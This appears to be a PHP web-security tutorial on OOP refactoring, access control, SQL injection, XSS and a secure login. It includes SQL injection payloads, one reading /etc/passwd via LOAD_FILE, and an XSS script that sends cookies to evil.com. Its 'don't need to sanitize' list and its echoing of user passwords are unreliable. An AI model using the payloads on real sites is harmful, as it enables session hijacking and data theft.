# Code Refactoring & Security Attacks

## Section 1: Object-Oriented Programming Refactoring

### From Procedural to OOP Structure

The migration from functions to classes provides better organization and security boundaries:

**Before (Procedural):**

```php
// Scattered across multiple files
function connect() { ... }
function db_read($query) { ... }
function db_write($query) { ... }
```

**After (OOP):**

```php
class Database {
    private function connect() { ... }
    public function read($query, $data = []) { ... }
    public function write($query, $data = []) { ... }
}

class Post extends Database {
    public function getHomePosts() { ... }
    public function getAllPosts() { ... }
    public function getOnePost($id) { ... }
}

class User extends Database {
    public function login($email, $password) { ... }
    public function getProfile($id) { ... }
}
```

### Benefits of OOP for Security

- **Encapsulation**: Private methods prevent direct database access.
- **Single Responsibility**: Each class handles one entity (Post, User), reducing query inconsistencies.
- **Inheritance**: Common functionality (Database class) shared across all entities.
- **Single Point of Control**: Changes to security defenses affect all database operations.

### Implementation Pattern

```php
// Instead of:
$result = db_read("SELECT * FROM posts WHERE id = $id");

// Use:
$post = new Post();
$result = $post->getOnePost($id);  // Security handled internally
```

---

## Section 2: Access Control

### Principle of Least Privilege

Grant users only the minimum permissions needed:

```php
function access($needed_rank) {
    $user_rank = $_SESSION['user_rank'] ?? '';

    switch ($needed_rank) {
        case 'admin':
            $allowed = ['admin'];
            break;
        case 'editor':
            $allowed = ['admin', 'editor'];
            break;
        case 'user':
            $allowed = ['admin', 'editor', 'user'];
            break;
        default:
            return false;
    }

    return in_array($user_rank, $allowed);
}
```

### Usage in Templates

```php
<?php if (access('admin')): ?>
    <a href="/delete-post">Delete</a>
<?php endif; ?>

<?php if (access('editor')): ?>
    <a href="/edit-post">Edit</a>
<?php endif; ?>
```

### Benefits

- Limits damage if an account is hacked, if a user is hacked, so the attacker abilities limits to user privileges only.
- Prevents privilege escalation attacks.
- Makes audit trails easier (fewer high-privilege accounts).

---

## Section 3: SQL Injection Attacks

### Attack Vector 1: POST Parameter Injection

**Vulnerable Code:**

```php
$email = $_POST['email'];
$query = "SELECT * FROM users WHERE email = '$email'";
```

**Attack:**

```
Email: ' OR '1'='1' --
Query becomes: SELECT * FROM users WHERE email = '' OR '1'='1' --
Result: Returns all users
```

### Attack Vector 2: GET Parameter Injection

**Vulnerable Code:**

```php
$id = $_GET['id'];
$query = "SELECT * FROM posts WHERE id = $id";
```

**Attack:**

```
URL: post.php?id=1 UNION SELECT user() FROM information_schema.tables --
Result: Reveals database user and structure
```

**Advanced Attack - File Reading:**

```
URL: post.php?id=1 UNION SELECT LOAD_FILE('/etc/passwd') --
Result: Exposes system files
```

### Multi-Layer Defense

#### Layer 1: Casting/Type Checking

```php
$id = (int) $_GET['id'];  // Convert to integer
// or
if (!is_numeric($id)) {
    die('Invalid ID');
}
```

#### Layer 2: Quote Escaping

```php
$email = addslashes($_POST['email']);
$query = "SELECT * FROM users WHERE email = '" . $email . "'";
```

#### Layer 3: Prepared Statements (Recommended)

```php
$con = new PDO("mysql:host=localhost;dbname=db", "user", "pass");
$stmt = $con->prepare("SELECT * FROM users WHERE email = :email");
$stmt->execute(['email' => $_POST['email']]);
$result = $stmt->fetchAll(PDO::FETCH_ASSOC);
```

**Why Prepared Statements Work:**

- Separates query structure from data.
- Database knows which parts are code and which are data.
- No variable interpolation in the query string.

---

## Section 4: Cross-Site Scripting (XSS) Attacks

**Vulnerable Code:**

```php
echo "Welcome, " . $_POST['name'];
// or (from database)
echo "Password: " . $user['password'];
```

**Attack - Store in Database:**

```
Name: <script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
```

**When displayed:**

- JavaScript executes in victim's browser.
- Session cookie is sent to attacker's server.
- Attacker can hijack the session.

### Simple XSS Example

```php
// Sign up with password containing JavaScript
$password: <img src=x onerror="alert('XSS')">

// When displayed on profile page, alert appears
```

### Defense: Output Encoding

```php
// Option 1: htmlspecialchars()
echo htmlspecialchars($user['password']);

// Option 2: Create sanitization function
function clean($data) {
    return htmlspecialchars($data, ENT_QUOTES, 'UTF-8');
}

echo clean($user['password']);
```

**What it does:**

```php
<script>alert('XSS')</script>
// becomes
&lt;script&gt;alert('XSS')&lt;/script&gt;
// Displayed as text, not executed
```

### When to Sanitize

**Always sanitize:**

- Any user input displayed in HTML.
- Any database data displayed in HTML (could contain old attacks).
- Data from URLs, forms, cookies, headers.

**You don't need to sanitize if:**

- Data is used in HTML attributes (use separate encoding).
- Data is used in JavaScript contexts (use JavaScript encoding).

---

## Section 5: Combined Security Pattern

### Secure Login Implementation

```php
class User extends Database {
    public function login($email, $password) {
        $error = '';

        // Validate email format
        if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
            return 'Wrong email or password';
        }

        // Prepare statement with placeholders
        $arr = ['email' => $email];
        $result = $this->read(
            "SELECT * FROM users WHERE email = :email LIMIT 1",
            $arr
        );

        if (!$result) {
            return 'Wrong email or password';  // Generic message
        }

        // Verify password hash
        if (!password_verify($password, $result[0]['password'])) {
            return 'Wrong email or password';  // Generic message
        }

        // Set session
        $_SESSION['user_id'] = $result[0]['id'];
        $_SESSION['user_rank'] = $result[0]['rank'];

        return '';  // Success
    }
}
---
```